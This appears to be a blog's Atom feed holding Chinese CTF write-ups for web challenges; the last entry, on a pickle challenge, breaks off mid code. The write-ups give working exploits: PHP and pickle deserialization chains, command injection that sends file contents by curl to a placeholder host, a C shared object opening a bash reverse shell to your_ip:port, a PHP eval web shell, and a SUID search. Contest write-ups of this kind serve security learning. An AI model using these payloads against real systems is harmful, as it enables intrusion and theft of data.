<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rossweisse</title>
  
  
  <link href="https://rossweisse.github.io/atom.xml" rel="self"/>
  
  <link href="https://rossweisse.github.io/"/>
  <updated>2022-03-29T12:46:35.952Z</updated>
  <id>https://rossweisse.github.io/</id>
  
  <author>
    <name>Rossweisse</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>das月赛合集</title>
    <link href="https://rossweisse.github.io/2022/03/29/WriteUp/das%E6%9C%88%E8%B5%9B%E5%90%88%E9%9B%86/"/>
    <id>https://rossweisse.github.io/2022/03/29/WriteUp/das%E6%9C%88%E8%B5%9B%E5%90%88%E9%9B%86/</id>
    <published>2022-03-29T12:40:35.000Z</published>
    <updated>2022-03-29T12:46:35.952Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Das-月赛合集"><a href="#Das-月赛合集" class="headerlink" title="Das 月赛合集"></a>Das 月赛合集</h1><h2 id="2022三月"><a href="#2022三月" class="headerlink" title="2022三月"></a>2022三月</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h4><p>简单的反序列化，直接给出 exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fin1</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$what1</span> = <span class="keyword">new</span> what();</span><br><span class="line"><span class="variable">$mix1</span> = <span class="keyword">new</span> mix();</span><br><span class="line"><span class="variable">$crow1</span> = <span class="keyword">new</span> crow();</span><br><span class="line"></span><br><span class="line"><span class="variable">$fin1</span>-&gt;f1 = <span class="variable">$what1</span>;</span><br><span class="line"><span class="variable">$what1</span>-&gt;a = <span class="variable">$mix1</span>;</span><br><span class="line"><span class="variable">$mix1</span>-&gt;m1 = <span class="variable">$crow1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> mix();</span><br><span class="line"></span><br><span class="line"><span class="variable">$crow1</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;\n system(&#x27;cat *&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$fin1</span>));</span><br></pre></td></tr></table></figure><h4 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h4><p>源码中重要的地方就只有这里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">s</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;class&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;getattribute&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            print(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip, num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br></pre></td></tr></table></figure><p>可以看到 waf 设定了黑名单，ban 了很多东西，那走 <code>eval</code> 代码执行这条路就封了，但是下面有一个 os.system(log)，这里会调用系统命令把 log 写入到 log.txt 中，而过 log 是不需要绕黑名单的，那好办。</p><p>` 反引号不在黑名单中，直接利用 log 进行 RCE。</p><p>tips: 直接 `ls` 的话，eval 会报错，所以要先注释掉。</p><blockquote><p>123#`ls`</p></blockquote><p>但是 os.system(log) 并未输出出来，所以还需要一个可以把 flag 显示出来的方法，利用 curl 外带。</p><blockquote><p>`curl -d “`cat tmp/log.txt`“ <a href="http://your_ip:port\`">http://your_ip:port\`</a></p></blockquote><p>由于” “ 空格被 waf ban了，所以利用 <code>%09</code> 绕过</p><blockquote><p>`curl%09-d%09”`cat%09tmp/log.txt`“%09<a href="http://your_ip:port\`">http://your_ip:port\`</a></p></blockquote><p><img src="https://raw.githubusercontent.com/lucifer-rossweisse/imgupload/main/img/image-20220328194604798.png"></p><h4 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h4><p>直接上传读取 <code>phpinfo</code> 没有拦截</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现 <code>disable_function</code> ban了很多函数</p><p><img src="https://raw.githubusercontent.com/lucifer-rossweisse/imgupload/main/img/image-20220328215115055.png"></p><p>用 <code>GCONV_PATH</code> 绕 <code>disable_function</code></p><p>传入 <code>gconv-modlues</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  EXP&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;exp    2</span><br><span class="line">module  INTERNAL    EXP&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;exp    2</span><br></pre></td></tr></table></figure><p>编译传入 exp.so 弹shell</p><p>exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/your_ip/port &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>gcc exp.c -o exp.so -shared -fPIC</p></blockquote><p>由于题目的 upload 中有 waf，所以可以仿造题目源码写一个 upload 入口点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;light&quot;&gt;&lt;span class=&quot;glow&quot;&gt;</span><br><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span> onsubmit=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span><br><span class="line">    嘿伙计，传个火？！</span><br><span class="line">    &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">    &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/span&gt;&lt;span class=&quot;flare&quot;&gt;&lt;/span&gt;&lt;div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = <span class="string">&#x27;/tmp/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;Failed!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存放路径就放在我们需要的 <code>/tmp/</code> 中。</p><p>然后由于 upload 的 waf 大小写敏感，所以可以大写字母绕过获取 <code>include</code>，包含传入的 base64 编码后文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(base64_decode(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zM2EzNWFlNGE1YWY2ODJjN2E1ZDE1MDhjZTE3OWE0My5waHA=&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样可以利用到上传点了</p><p>还可以利用这个方式传入一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就可以任意代码执行触发 exp.so</p><p><img src="https://raw.githubusercontent.com/lucifer-rossweisse/imgupload/main/img/image-20220329162307932.png"></p><p>弹出 shell，但是没有权限读取 flag，利用 find 查看设置了 SUID 的文件。</p><blockquote><p>find / -user root -perm -4000 -print 2&gt;/dev/null</p></blockquote><p><img src="https://raw.githubusercontent.com/lucifer-rossweisse/imgupload/main/img/image-20220329162816048.png"></p><p>直接用 nl 读取。</p><p><img src="https://raw.githubusercontent.com/lucifer-rossweisse/imgupload/main/img/image-20220329162843091.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Das-月赛合集&quot;&gt;&lt;a href=&quot;#Das-月赛合集&quot; class=&quot;headerlink&quot; title=&quot;Das 月赛合集&quot;&gt;&lt;/a&gt;Das 月赛合集&lt;/h1&gt;&lt;h2 id=&quot;2022三月&quot;&gt;&lt;a href=&quot;#2022三月&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>第四届强网拟态WP</title>
    <link href="https://rossweisse.github.io/2021/10/29/WriteUp/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/"/>
    <id>https://rossweisse.github.io/2021/10/29/WriteUp/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/</id>
    <published>2021-10-29T07:30:08.000Z</published>
    <updated>2021-10-29T07:34:08.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h3><p>题目给出源码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> notevil = <span class="built_in">require</span>(<span class="string">&quot;./notevil&quot;</span>); <span class="comment">// patched something...</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&quot;cookie-session&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">  keys: [<span class="built_in">Math</span>.random().toString(<span class="number">16</span>)],</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in root directory but name is randomized</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> utils = &#123;</span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="title">md5</span>(<span class="params">s</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      resolve(crypto.createHash(<span class="string">&quot;md5&quot;</span>).update(s).digest(<span class="string">&quot;hex&quot;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="title">readFile</span>(<span class="params">n</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.readFile(n, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          reject(err);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          resolve(data);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&quot;./static/index.html&quot;</span>).toString();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> template.replace(<span class="string">&quot;&#123;&#123;res&#125;&#125;&quot;</span>, s.join(<span class="string">&#x27;&lt;br&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> e = req.body.e;</span><br><span class="line">  <span class="keyword">const</span> his = req.session.his || [];</span><br><span class="line">  <span class="keyword">if</span> (e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> ret = (<span class="keyword">await</span> notevil(e, utils)).toString();</span><br><span class="line">      his.unshift(<span class="string">`<span class="subst">$&#123;e&#125;</span> = <span class="subst">$&#123;ret&#125;</span>`</span>);</span><br><span class="line">      <span class="keyword">if</span> (his.length &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        his.pop();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(error);</span><br><span class="line">      his.add(<span class="string">`<span class="subst">$&#123;e&#125;</span> = wrong?`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    req.session.his = his;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.send(render(his));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function">(<span class="params">err, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">  res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(process.env.PORT || <span class="number">8888</span>);</span><br></pre></td></tr></table></figure><p>先试试 <code>readFile(&#39;/flag&#39;)</code>，发现直接得到flag了。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024171232826.png"></p><h3 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h3><p>题目给出源码，主要看 app.py。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template_string, url_for,redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> notadmin</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    info = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        x = base64.b64decode(info)</span><br><span class="line">        User = restricted_loads(x)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>很明显的 pickle 反序列化，而且限定了 module in [‘config’] 和 ‘__’，然后看 config.py。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">notadmin=&#123;<span class="string">&quot;admin&quot;</span>:<span class="string">&quot;no&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> notadmin[<span class="string">&quot;admin&quot;</span>]==<span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">eval</span>(s)</span><br></pre></td></tr></table></figure><p>需要 notadmin 中的 admin 参数为 yes 才能执行 eval。</p><p>那么先是全局变量覆盖，利用 c 和 s 操作码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">b&quot;&quot;&quot;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">S&quot;yes&quot;</span></span><br><span class="line"><span class="string">s0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>解释一下，先是利用 c 操作码导入 config 中的 notadmin，然后利用 s 操作码覆盖 notadmin 为 {‘admin’: ‘yes’}，即可成功绕过 if 。</p><p>然后就是调用 config 中的 backdoor 函数去执行 eval。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 